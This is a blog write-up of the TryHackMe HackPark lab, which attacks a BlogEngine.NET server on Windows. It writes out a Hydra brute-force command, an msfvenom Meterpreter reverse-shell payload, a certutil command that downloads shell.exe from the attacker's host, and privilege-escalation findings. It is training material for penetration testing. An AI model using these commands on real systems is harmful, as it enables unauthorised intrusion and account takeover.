---
layout: blog.html
title: "TryHackMe - HackPark Writeup"
date: 2021-11-02
thumbnail: "https://jacen-safe.s3.us-west-004.backblazeb2.com/n1yPsnqz5pPo.png"
---

[HackPark](https://tryhackme.com/room/hackpark) is a Medium difficulty room, although it guides you along fairly well for the initial foothold, and it's pretty easy to root if you do proper basic enumeration.
<!-- more -->

## Initial Enumeration
The first step in any pentest situation is enumeration. It's important to get as much information about the machine and its users as possible. To start off, we'll use Nmap to perform a port scan and see what services are active and listening on the box. Nmap is a versitle tool, and many people have their own preferred methods to balance speed and accuracy, but here are the options I'll use.

- `-sC`: Run default scripts. Nmap can do additional enumeration beyond just checking for open ports, and this option will run some quick and useful extra scans to give us even more information about what we're working with.
- `-sV`: Run version detection. Knowing what specific version of a service is in use can help with finding potential vulnerabilities, or ruling them out.
- `-v`: Be verbose. This outputs extra information to the console as the scan runs, the most useful of which are status updates and showing open ports as it finds them.
- `-oN`: Output to a file in the Nmap format. Having a file to refer back to intead of having to scroll through console output is very useful. Nmap can save to a variety of file formats, and you may have reasons to use them, but for me just the normal plain-text format is enough.
- `-Pn`: Don't use `ping` for host detection. This machine doesn't respond to ping, so to get Nmap to scan it at all, we need to use this option.

Using these options, we're left with the following command:
```bash
nmap -sC -sV -vv -Pn -oN nmap-initial.txt 10.10.97.88
```

This machine is surprising quiet considering it's a Windows machine. We get two open ports: 80 and 3389. Nmap detects port 80 running Microsoft IIS and 3389 hosting Remote Desktop.

Investigating the web server on port 80, we find a simple blog with a single post. A little bit of poking around reveals that the site is powered by ASPX, which is pretty common for an IIS server. The site seems to be powered by [BlogEngine.NET](https://blogengine.io/).

## Brute Force
There's a login form accessible from the site's main menu, so we'll try a brute force attack against that to see if the password happens to be vulnerable. Usernames are revealed by BlogEngine through a feature that lets you see all posts by a specific user. The username appears to be "Admin", which would have been an easily guessable username anyway.

We'll use [Hydra](https://github.com/vanhauser-thc/thc-hydra) for our brute force attack. There's a lot of junk we need to tack onto the requests we send to the form, but the main points to note are that `ctl00%24MainContent%24LoginUser%24UserName` is the username field and `ctl00%24MainContent%24LoginUser%24Password` is the password field. We know the password was wrong if we get a "Login failed" message, so we'll tell Hydra to look for that string.

```bash
hydra -l Admin -P /usr/share/wordlists/rockyou.txt 10.10.97.88 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=E2OPdwooQYKBe3hHmFyHa%2Bf42FNOA%2B0i3IfPFd2E6QX4ZFLFHeNhaurK%2BkcrI5TnLLXMiFxKO8IoF2PNUe4yxUE00Ypa1Fw9vUIoNSabbCRy2tPdaEfUccXF3nsmyHtUxFdrxb6w%2FLJ5tv5p5Uo5e4FqjE6fJOA3%2FYKOPDlZ9V38FMGP&__EVENTVALIDATION=x4B7wKhqtjq9qtvOm0hyFmAk48Vm4da4a79DWyJ1XRt6%2BGfR%2BQEE2Pfw9lQ7O0mrmbTenxGMb8si9MEfKGEXDxVPHW99J1XBzWlK7G5Hl11sx5J9sWQwIwtNAFx8skqv9lVGaynV%2BGp5CV81h3etCvc60o8Yu0m5nCeTk2o5BNZTNaEx&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
```

Hydra sucessfully finds the password for us, giving us access to the site's admin panel.

## Remote Code Execution
The "About" section gives us a version number of 3.3.6.0. Conveniently, there happens to be [a useful vulnerability with an exploit available on Exploit-DB](https://www.exploit-db.com/exploits/46353). The author was kind enough to give fairly detailed instructions within the script.

Following the instructions in the exploit, we'll set our attacking machine's IP in the script and use BlogEngine's post editor to upload it as `PostView.ascx`. Then we'll leverage a path traversal vulnerability to get BlogEngine to execute our code and give us a reverse shell. We land as a lowly IIS worker user.

This particular Windows reverse shell really sucks and is supposedly unstable, so upgrading to something a bit more attacker-friendly would be nice. We'll throw together an MSFVenom payload to give us a nice Meterpreter shell.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.14.52 LPORT=9001 -f exe > shell.exe
```

Unfortunately, getting PowerShell to work through this garbage shell is more work than I care to put in, so we'll try out the Certutil method for downloading our file to the target machine ([Thanks, HackTricks](https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#download)).

```
certutil.exe -urlcache -split -f "http://10.13.14.52:8000/shell.exe" shell.exe
```

## Privilege Escalation
To give us a good starting point, we'll try running WinPEAS on the machine and see what it can find for us. A handful of interesting results come back.

```
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  *************
```

```
    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================
```

```
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
   =================================================================================================
```

The unquoted service path lands in a folder we probably don't have access to, so it's unlikely that we'll be able to take advantage of that. The DLL hijack is promising, but will also take a bit of legwork to set up. The AutoLogon credentials are the most baindead easy possibility of getting access, so we'll try those first. 

![Order 66](https://i.snap.as/3mipsa0t.png)

Surprisingly, it just works, and we end up with an admin RDP session. From there we're able to grab both of the flags without issue.

The intended method is using write access to the SystemScheduler folder to overwrite an executable and get a second reverse shell (technically an EXE hijack as opposed to a DLL hijack), but the RDP method is just so much more painless.